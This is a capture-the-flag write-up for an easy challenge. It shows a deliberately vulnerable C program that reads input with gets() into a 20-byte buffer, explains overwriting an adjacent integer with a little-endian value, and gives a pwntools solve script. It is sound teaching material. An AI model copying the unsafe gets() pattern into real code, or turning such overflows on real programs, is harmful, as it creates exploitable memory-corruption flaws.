
# Bluffer Overflow 😏

## Overview & Description

Author : rennfurukawa

Points : Unknown

Difficulty : Easy

Maybe it's your first time pwning? Can you overwrite the variable?

[chall.c](https://drive.google.com/file/d/1VaDHn8tl1eZcxAo1wNxlBnqFRrLFI6Ot/view?usp=drive_link)

## Hints

- Modified the variable with `specific` value
- Maybe **pwntools** can help you 😉

## TL;DR

- Overwrite the local variable with the character that have the exact value
- To find the character, you need to change the decimal value to hexadecimal
- Because of endianness, you need to reverse the character

## Exploitation

We were given the source code in C

<details>
<summary>chall.c</summary>

```c
#include <stdio.h>
#include <stdlib.h>

char buff[20];
int buff2;

void setup(){
	setvbuf(stdin, buff, _IONBF, 0);
	setvbuf(stdout, buff, _IONBF, 0);
	setvbuf(stderr, buff, _IONBF, 0);
}

void flag_handler(){
	FILE *f = fopen("flag.txt","r");
  	if (f == NULL) {
    	printf("Cannot find flag.txt!");
    	exit(0);
  }
}

void buffer(){
	buff2 = 0;
	printf("Can you get the exact value to print the flag?\n");
	printf("Input: ");
	fflush(stdout);
	gets(buff); 
	if (buff2 > 5134160) {
		printf("Too high!\n\n");
	} else if (buff2 == 5134160){
		printf("Congrats, You got the right value!\n");
	 	system("cat flag.txt");
	} else {
		printf("Sad, too low! :(, maybe you can add *more* value 0_0\n\n");
	}
	printf("Output : %s, Value : %d \n", buff, buff2);
}

int main(){
	flag_handler();
	setup();
	buffer();
}
```
</details>

So, to get the flag, we need to change the **buff2** value to **5134160**

First, we need to find the buffer, try to send character one by one, until the program return the value

After some trial and error, we find that the after the 20th input, the program turns the value

![](https://i.imgur.com/DZvy3au.png)

As we can see, if we send a character, program will turn its value to decimal

Based on ASCII Value, 65 is decimal of "A" character

![](https://i.imgur.com/D4ucS5n.png)

But, if we add character more than 1, the program will turn the value like this

![](https://i.imgur.com/ZqmeFNr.png)

This will happen if you store a byte into computer memory, program will read it in a certain order. So your value is converted to hexadecimal then reversed because of endianness. After that program will return it to decimal value.

To find the character, we need to change the value that we need to hexadecimal, then reverse it to big-endian

We can use python to do that

![](https://i.imgur.com/RN7HmgI.png)

We can pass that value to server and check if we get the flag

![](https://i.imgur.com/Rc3lILq.png)

And yeah, we get the flag !
    
Anyway, you can use pwntools to solve it more easier 😉

## Solve Script
    
<details>
<summary>solve.py</summary>

```python
from pwn import *

p = process("./bluffer")
# p = remote("HOST", PORT) # modified after competition

offset = 20

payload = flat({
	offset : [
		5134160
	]
})


p.sendline(payload)

p.interactive()
```